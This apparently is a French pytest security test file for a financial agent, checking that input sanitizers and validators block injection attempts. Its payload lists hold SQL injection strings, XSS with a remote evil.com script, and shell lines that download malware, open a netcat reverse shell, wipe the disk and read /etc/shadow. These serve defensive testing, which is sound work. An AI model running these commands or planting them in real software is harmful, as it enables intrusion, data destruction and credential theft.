"""
Tests de Sécurité - Validation et Sanitisation des Inputs

Ces tests valident la robustesse du système contre les attaques
par injection, la validation appropriée des entrées utilisateur
et la sanitisation des données d'entrée.
"""

import pytest
import re
import json
import html
import urllib.parse
from decimal import Decimal, InvalidOperation
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Union, Callable
from dataclasses import dataclass
from unittest.mock import Mock, patch
import string
import random

from finagent.business.models.portfolio_models import Portfolio, Position
from finagent.business.models.decision_models import InvestmentDecision, DecisionType
from finagent.business.exceptions import ValidationError, DataError

# Import des utilitaires de test
from tests.utils import create_test_portfolio
from tests.security import SECURITY_CONFIG


@dataclass
class InputValidationResult:
    """Résultat de test de validation d'input"""
    test_name: str
    input_type: str
    validation_passed: bool
    sanitization_effective: bool
    injection_prevented: bool
    error_handling_appropriate: bool
    security_score: float


class InputSanitizer:
    """Sanitiseur d'inputs pour sécurité"""
    
    def __init__(self):
        self.blocked_patterns = SECURITY_CONFIG["blocked_patterns"]
        self.sanitization_log = []
    
    def sanitize_string_input(self, input_string: str, context: str = "general") -> str:
        """Sanitise une chaîne d'entrée"""
        if not isinstance(input_string, str):
            raise ValidationError("Input doit être une chaîne")
        
        original_input = input_string
        sanitized = input_string
        
        # Échapper HTML
        sanitized = html.escape(sanitized)
        
        # URL encoding pour caractères dangereux
        dangerous_chars = ['<', '>', '"', "'", '&', '\n', '\r', '\t']
        for char in dangerous_chars:
            if char in sanitized:
                sanitized = sanitized.replace(char, urllib.parse.quote(char))
        
        # Supprimer patterns dangereux
        for pattern in self.blocked_patterns:
            if re.search(pattern, sanitized, re.IGNORECASE):
                sanitized = re.sub(pattern, '[BLOCKED]', sanitized, flags=re.IGNORECASE)
                self.sanitization_log.append({
                    "pattern": pattern,
                    "original": original_input,
                    "context": context,
                    "timestamp": datetime.now()
                })
        
        # Limiter longueur
        max_length = 1000 if context == "general" else 100
        if len(sanitized) > max_length:
            sanitized = sanitized[:max_length] + "..."
        
        return sanitized
    
    def validate_numeric_input(self, input_value: Any, min_value: Optional[float] = None,
                             max_value: Optional[float] = None) -> float:
        """Valide une entrée numérique"""
        try:
            # Conversion en float
            if isinstance(input_value, str):
                # Nettoyer la chaîne
                cleaned = re.sub(r'[^\d.+-]', '', input_value)
                if not cleaned or cleaned in ['+', '-', '.']:
                    raise ValueError("Valeur numérique invalide")
                numeric_value = float(cleaned)
            elif isinstance(input_value, (int, float, Decimal)):
                numeric_value = float(input_value)
            else:
                raise ValueError(f"Type invalide pour valeur numérique: {type(input_value)}")
            
            # Vérifier limites
            if min_value is not None and numeric_value < min_value:
                raise ValueError(f"Valeur {numeric_value} inférieure au minimum {min_value}")
            
            if max_value is not None and numeric_value > max_value:
                raise ValueError(f"Valeur {numeric_value} supérieure au maximum {max_value}")
            
            # Vérifier valeurs spéciales
            if not (float('-inf') < numeric_value < float('inf')):
                raise ValueError("Valeur infinie non autorisée")
            
            return numeric_value
            
        except (ValueError, TypeError, OverflowError) as e:
            raise ValidationError(f"Validation numérique échouée: {e}")
    
    def validate_symbol_input(self, symbol: str) -> str:
        """Valide un symbole boursier"""
        if not isinstance(symbol, str):
            raise ValidationError("Symbol doit être une chaîne")
        
        # Nettoyer le symbole
        cleaned_symbol = symbol.strip().upper()
        
        # Vérifier format
        if not re.match(r'^[A-Z]{1,10}$', cleaned_symbol):
            raise ValidationError(f"Format de symbole invalide: {symbol}")
        
        # Vérifier longueur
        if len(cleaned_symbol) < 1 or len(cleaned_symbol) > 10:
            raise ValidationError(f"Longueur de symbole invalide: {len(cleaned_symbol)}")
        
        # Vérifier que ce n'est pas un pattern d'injection
        for pattern in self.blocked_patterns:
            if re.search(pattern, cleaned_symbol, re.IGNORECASE):
                raise ValidationError(f"Symbole contient pattern dangereux: {symbol}")
        
        return cleaned_symbol
    
    def validate_date_input(self, date_input: Any) -> datetime:
        """Valide une entrée de date"""
        if isinstance(date_input, datetime):
            validated_date = date_input
        elif isinstance(date_input, str):
            try:
                # Tenter différents formats
                for date_format in ['%Y-%m-%d', '%Y-%m-%d %H:%M:%S', '%Y-%m-%dT%H:%M:%S']:
                    try:
                        validated_date = datetime.strptime(date_input, date_format)
                        break
                    except ValueError:
                        continue
                else:
                    raise ValueError("Aucun format de date reconnu")
            except ValueError as e:
                raise ValidationError(f"Format de date invalide: {date_input}")
        else:
            raise ValidationError(f"Type de date invalide: {type(date_input)}")
        
        # Vérifier que la date est raisonnable
        min_date = datetime(1900, 1, 1)
        max_date = datetime.now() + timedelta(days=365 * 10)  # 10 ans dans le futur
        
        if validated_date < min_date or validated_date > max_date:
            raise ValidationError(f"Date hors limites raisonnables: {validated_date}")
        
        return validated_date


class InjectionTester:
    """Testeur d'attaques par injection"""
    
    def __init__(self):
        self.injection_attempts = []
        self.prevented_attacks = []
    
    def generate_sql_injection_payloads(self) -> List[str]:
        """Génère des payloads d'injection SQL"""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; UPDATE users SET password='hacked'; --",
            "' UNION SELECT * FROM secrets --",
            "'; INSERT INTO logs VALUES('hacked'); --",
            "admin'--",
            "' OR 1=1 --",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
    
    def generate_xss_payloads(self) -> List[str]:
        """Génère des payloads XSS"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<script src='http://evil.com/xss.js'></script>",
            "';alert('XSS');//"
        ]
    
    def generate_command_injection_payloads(self) -> List[str]:
        """Génère des payloads d'injection de commandes"""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; wget http://evil.com/malware",
            "` cat /etc/shadow `",
            "$(cat /etc/hosts)",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| nc evil.com 4444 -e /bin/sh"
        ]
    
    def test_injection_prevention(self, validator_func: Callable, 
                                payloads: List[str], context: str) -> Dict[str, Any]:
        """Teste la prévention d'injections"""
        results = {
            "total_attempts": len(payloads),
            "prevented_count": 0,
            "failed_validations": [],
            "successful_injections": [],
            "prevention_rate": 0.0
        }
        
        for payload in payloads:
            try:
                # Tenter validation avec payload malicieux
                validated_result = validator_func(payload)
                
                # Si validation réussit, vérifier si payload neutralisé
                if payload.lower() in str(validated_result).lower():
                    # Payload non neutralisé - injection potentielle
                    results["successful_injections"].append({
                        "payload": payload,
                        "result": str(validated_result),
                        "context": context
                    })
                else:
                    # Payload neutralisé
                    results["prevented_count"] += 1
                    self.prevented_attacks.append({
                        "payload": payload,
                        "context": context,
                        "timestamp": datetime.now()
                    })
                
            except (ValidationError, ValueError, TypeError) as e:
                # Validation échouée - injection prévenue
                results["prevented_count"] += 1
                results["failed_validations"].append({
                    "payload": payload,
                    "error": str(e),
                    "context": context
                })
                
                self.prevented_attacks.append({
                    "payload": payload,
                    "context": context,
                    "error": str(e),
                    "timestamp": datetime.now()
                })
        
        results["prevention_rate"] = results["prevented_count"] / results["total_attempts"]
        
        return results


@pytest.mark.security
@pytest.mark.input_validation
class TestBasicInputValidation:
    """Tests de validation d'input de base"""
    
    @pytest.fixture
    def input_sanitizer(self):
        """Sanitiseur d'inputs pour tests"""
        return InputSanitizer()
    
    @pytest.fixture
    def injection_tester(self):
        """Testeur d'injections pour tests"""
        return InjectionTester()
    
    def test_string_sanitization(self, input_sanitizer):
        """Test sanitisation des chaînes"""
        print("🧹 Test sanitisation chaînes")
        
        # Test inputs avec différents niveaux de danger
        test_inputs = [
            {
                "input": "Normal string without issues",
                "expected_safe": True,
                "context": "safe_input"
            },
            {
                "input": "<script>alert('XSS')</script>",
                "expected_safe": False,
                "context": "xss_attempt"
            },
            {
                "input": "Hello & goodbye <tag>",
                "expected_safe": False,
                "context": "html_content"
            },
            {
                "input": "'; DROP TABLE users; --",
                "expected_safe": False,
                "context": "sql_injection"
            },
            {
                "input": "javascript:alert('malicious')",
                "expected_safe": False,
                "context": "js_execution"
            }
        ]
        
        sanitization_results = {}
        
        for i, test_case in enumerate(test_inputs):
            input_string = test_case["input"]
            context = test_case["context"]
            expected_safe = test_case["expected_safe"]
            
            try:
                sanitized = input_sanitizer.sanitize_string_input(input_string, context)
                
                # Vérifier efficacité sanitisation
                contains_dangerous = any(
                    pattern in sanitized.lower() 
                    for pattern in ["<script", "javascript:", "drop table", "union select"]
                )
                
                sanitization_effective = not contains_dangerous
                test_passed = sanitization_effective or not expected_safe
                
                sanitization_results[f"test_{i+1}"] = {
                    "original": input_string,
                    "sanitized": sanitized,
                    "expected_safe": expected_safe,
                    "sanitization_effective": sanitization_effective,
                    "test_passed": test_passed
                }
                
                print(f"   Test {i+1} ({context}): {'✓' if test_passed else '✗'}")
                if not expected_safe:
                    print(f"      Original: {input_string}")
                    print(f"      Sanitisé: {sanitized}")
                
            except ValidationError as e:
                # Validation échouée - peut être approprié pour inputs dangereux
                test_passed = not expected_safe
                sanitization_results[f"test_{i+1}"] = {
                    "original": input_string,
                    "sanitized": None,
                    "expected_safe": expected_safe,
                    "validation_error": str(e),
                    "test_passed": test_passed
                }
                
                print(f"   Test {i+1} ({context}): {'✓' if test_passed else '✗'} (Validation échouée)")
        
        # Calculer score sanitisation
        passed_tests = sum(1 for r in sanitization_results.values() if r["test_passed"])
        sanitization_score = passed_tests / len(sanitization_results)
        
        print(f"\n📊 Score sanitisation: {sanitization_score:.2f}")
        
        # Assertions sanitisation
        assert sanitization_score >= 0.8  # Au moins 80% des tests passent
        
        return {
            "sanitization_results": sanitization_results,
            "sanitization_score": sanitization_score,
            "sanitization_log": input_sanitizer.sanitization_log
        }
    
    def test_numeric_validation(self, input_sanitizer):
        """Test validation numérique"""
        print("🔢 Test validation numérique")
        
        # Test cas valides
        valid_inputs = [
            ("123.45", 123.45),
            (100, 100.0),
            (Decimal("50.25"), 50.25),
            ("  42.0  ", 42.0),  # Avec espaces
            ("-10.5", -10.5)
        ]
        
        # Test cas invalides
        invalid_inputs = [
            "not_a_number",
            "123.45.67",  # Double point
            "1e999",  # Trop grand
            float('inf'),  # Infini
            float('nan'),  # NaN
            "<script>123</script>",  # XSS
            "'; DROP TABLE numbers; --"  # SQL injection
        ]
        
        validation_results = {"valid": {}, "invalid": {}}
        
        print("   Tests inputs valides:")
        for i, (test_input, expected) in enumerate(valid_inputs):
            try:
                result = input_sanitizer.validate_numeric_input(
                    test_input, min_value=-1000, max_value=1000
                )
                test_passed = abs(result - expected) < 0.001
                validation_results["valid"][f"valid_{i+1}"] = {
                    "input": test_input,
                    "expected": expected,
                    "result": result,
                    "test_passed": test_passed
                }
                print(f"      {test_input} -> {result}: {'✓' if test_passed else '✗'}")
                
            except ValidationError as e:
                validation_results["valid"][f"valid_{i+1}"] = {
                    "input": test_input,
                    "expected": expected,
                    "error": str(e),
                    "test_passed": False
                }
                print(f"      {test_input}: ✗ (Erreur: {e})")
        
        print("   Tests inputs invalides:")
        for i, test_input in enumerate(invalid_inputs):
            try:
                result = input_sanitizer.validate_numeric_input(test_input)
                # Si validation réussit pour input invalide, c'est un problème
                validation_results["invalid"][f"invalid_{i+1}"] = {
                    "input": test_input,
                    "result": result,
                    "test_passed": False,  # Échec car validation a réussi
                    "issue": "Validation réussie pour input invalide"
                }
                print(f"      {test_input}: ✗ (Validation a réussi!)")
                
            except (ValidationError, ValueError, TypeError) as e:
                # Validation échouée comme attendu
                validation_results["invalid"][f"invalid_{i+1}"] = {
                    "input": test_input,
                    "error": str(e),
                    "test_passed": True
                }
                print(f"      {test_input}: ✓ (Rejeté)")
        
        # Calculer scores
        valid_score = sum(1 for r in validation_results["valid"].values() if r["test_passed"]) / len(validation_results["valid"])
        invalid_score = sum(1 for r in validation_results["invalid"].values() if r["test_passed"]) / len(validation_results["invalid"])
        overall_score = (valid_score + invalid_score) / 2
        
        print(f"\n📊 Scores validation numérique:")
        print(f"   Inputs valides: {valid_score:.2f}")
        print(f"   Inputs invalides: {invalid_score:.2f}")
        print(f"   Score global: {overall_score:.2f}")
        
        # Assertions validation numérique
        assert valid_score >= 0.8  # Au moins 80% inputs valides acceptés
        assert invalid_score >= 0.9  # Au moins 90% inputs invalides rejetés
        
        return {
            "validation_results": validation_results,
            "valid_score": valid_score,
            "invalid_score": invalid_score,
            "overall_score": overall_score
        }
    
    def test_symbol_validation(self, input_sanitizer):
        """Test validation des symboles boursiers"""
        print("📈 Test validation symboles")
        
        # Symboles valides
        valid_symbols = ["AAPL", "GOOGL", "MSFT", "TSLA", "BRK.A", "SPY"]
        
        # Symboles invalides
        invalid_symbols = [
            "",  # Vide
            "TOOLONGSYMBOL",  # Trop long
            "123",  # Numérique
            "aa<>pl",  # Caractères invalides
            "<script>alert('xss')</script>",  # XSS
            "'; DROP TABLE stocks; --",  # SQL injection
            "javascript:alert('hack')"  # JS injection
        ]
        
        symbol_results = {"valid": {}, "invalid": {}}
        
        # Test symboles valides
        for symbol in valid_symbols:
            try:
                validated = input_sanitizer.validate_symbol_input(symbol)
                test_passed = validated == symbol.upper()
                symbol_results["valid"][symbol] = {
                    "original": symbol,
                    "validated": validated,
                    "test_passed": test_passed
                }
                print(f"   {symbol} -> {validated}: {'✓' if test_passed else '✗'}")
                
            except ValidationError as e:
                symbol_results["valid"][symbol] = {
                    "original": symbol,
                    "error": str(e),
                    "test_passed": False
                }
                print(f"   {symbol}: ✗ (Erreur: {e})")
        
        # Test symboles invalides
        for symbol in invalid_symbols:
            try:
                validated = input_sanitizer.validate_symbol_input(symbol)
                # Validation réussie pour symbole invalide = problème
                symbol_results["invalid"][symbol] = {
                    "original": symbol,
                    "validated": validated,
                    "test_passed": False,
                    "issue": "Symbole invalide accepté"
                }
                print(f"   {symbol}: ✗ (Accepté à tort!)")
                
            except ValidationError as e:
                # Validation échouée comme attendu
                symbol_results["invalid"][symbol] = {
                    "original": symbol,
                    "error": str(e),
                    "test_passed": True
                }
                print(f"   {symbol}: ✓ (Rejeté)")
        
        # Calculer scores
        valid_score = sum(1 for r in symbol_results["valid"].values() if r["test_passed"]) / len(symbol_results["valid"])
        invalid_score = sum(1 for r in symbol_results["invalid"].values() if r["test_passed"]) / len(symbol_results["invalid"])
        overall_score = (valid_score + invalid_score) / 2
        
        print(f"\n📊 Scores validation symboles:")
        print(f"   Symboles valides: {valid_score:.2f}")
        print(f"   Symboles invalides: {invalid_score:.2f}")
        print(f"   Score global: {overall_score:.2f}")
        
        # Assertions validation symboles
        assert valid_score >= 0.8  # Au moins 80% symboles valides acceptés
        assert invalid_score >= 0.9  # Au moins 90% symboles invalides rejetés
        
        return {
            "symbol_results": symbol_results,
            "valid_score": valid_score,
            "invalid_score": invalid_score,
            "overall_score": overall_score
        }


@pytest.mark.security
@pytest.mark.input_validation
@pytest.mark.slow
class TestAdvancedInputValidation:
    """Tests avancés de validation d'input"""
    
    def test_injection_prevention(self, injection_tester, input_sanitizer):
        """Test prévention d'injections"""
        print("💉 Test prévention injections")
        
        # Test injections SQL
        sql_payloads = injection_tester.generate_sql_injection_payloads()
        sql_results = injection_tester.test_injection_prevention(
            lambda x: input_sanitizer.sanitize_string_input(x, "sql_context"),
            sql_payloads,
            "sql_injection"
        )
        
        print(f"   SQL injections:")
        print(f"      Tentatives: {sql_results['total_attempts']}")
        print(f"      Prévenues: {sql_results['prevented_count']}")
        print(f"      Taux prévention: {sql_results['prevention_rate']:.1%}")
        
        # Test injections XSS
        xss_payloads = injection_tester.generate_xss_payloads()
        xss_results = injection_tester.test_injection_prevention(
            lambda x: input_sanitizer.sanitize_string_input(x, "web_context"),
            xss_payloads,
            "xss_injection"
        )
        
        print(f"   XSS injections:")
        print(f"      Tentatives: {xss_results['total_attempts']}")
        print(f"      Prévenues: {xss_results['prevented_count']}")
        print(f"      Taux prévention: {xss_results['prevention_rate']:.1%}")
        
        # Test injections de commandes
        cmd_payloads = injection_tester.generate_command_injection_payloads()
        cmd_results = injection_tester.test_injection_prevention(
            lambda x: input_sanitizer.sanitize_string_input(x, "command_context"),
            cmd_payloads,
            "command_injection"
        )
        
        print(f"   Command injections:")
        print(f"      Tentatives: {cmd_results['total_attempts']}")
        print(f"      Prévenues: {cmd_results['prevented_count']}")
        print(f"      Taux prévention: {cmd_results['prevention_rate']:.1%}")
        
        # Score global prévention
        all_results = [sql_results, xss_results, cmd_results]
        global_prevention_rate = sum(r['prevention_rate'] for r in all_results) / len(all_results)
        
        print(f"\n📊 Taux prévention global: {global_prevention_rate:.1%}")
        
        # Afficher injections réussies (problématiques)
        for result_type, results in [("SQL", sql_results), ("XSS", xss_results), ("CMD", cmd_results)]:
            if results['successful_injections']:
                print(f"\n⚠️  Injections {result_type} réussies:")
                for inj in results['successful_injections']:
                    print(f"      {inj['payload']}")
        
        # Assertions prévention injections
        assert global_prevention_rate >= 0.9  # Au moins 90% prévention
        assert sql_results['prevention_rate'] >= 0.9  # SQL critique
        assert xss_results['prevention_rate'] >= 0.9  # XSS critique
        
        return {
            "sql_results": sql_results,
            "xss_results": xss_results,
            "cmd_results": cmd_results,
            "global_prevention_rate": global_prevention_rate,
            "prevented_attacks": injection_tester.prevented_attacks
        }


if __name__ == "__main__":
    # Exécution directe pour tests de développement
    pytest.main([__file__, "-v", "--tb=short", "-m", "input_validation and not slow"])